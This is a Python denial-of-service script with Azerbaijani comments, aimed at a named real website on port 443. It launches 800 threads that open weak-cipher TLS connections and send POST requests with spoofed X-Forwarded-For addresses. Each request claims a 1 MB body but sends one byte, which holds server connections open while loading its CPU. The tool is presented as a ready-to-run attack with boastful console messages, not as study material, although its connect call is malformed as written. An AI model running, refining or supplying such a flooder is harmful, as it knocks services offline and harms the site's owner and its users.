import socket
import ssl
import threading
import random
import time
import string
import os

# --- HƏDƏF ---
TARGET_HOST = “https://empro.az/"
TARGET_PORT = 443
THREADS = 800 # Railway Paid üçün maksimal stabil güc

def r_str(n=15):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def final_strike():
    # SSL/TLS Handshake-i serveri kilitləmək üçün 'Ağır' tənzimləyirik
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Şifrələməni serverin CPU-sunu ən çox yoran üsulda saxlayırıq (RSA-AES)
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')

    while True:
        try:
            # TCP bağlantısı - Paket gecikməsini (Nagle) bypass edirik
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)

            # SSL bağlantısını qur və serveri CPU hesablamağa məcbur et
            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # Serveri daxili bazadan vurmaq üçün ağır müraciət
            # Content-Length hiləsi ilə bağlantını 'zombi' vəziyyətinə salırıq
            for _ in range(200):
                path = f"/?v={time.time()}&id={r_str(32)}&invite_code={random.randint(1000, 9999)}"
                ip = f"{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15\r\n"
                    f"X-Forwarded-For: {ip}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 1048576\r\n" # 1 Megabyte yalançı yük
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                ).encode()

                conn.sendall(payload)
                # Serveri kilitləyən zərbə: Yarımçıq data göndəririk
                conn.send(os.urandom(1)) 
            
            # Bağlantını bağlamırıq, timeout olana qədər serverin portunu tuturuq
            time.sleep(2)
            conn.close()
        except:
            pass

def main():
    print(f"☢️  VOID-NULL PROTOCOL ACTIVATED: {TARGET_HOST}")
    print("[!] Target Buffer is being saturated at the protocol level.")
    
    for i in range(THREADS):
        t = threading.Thread(target=final_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Protocol Warheads Active...")
            time.sleep(0.5)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
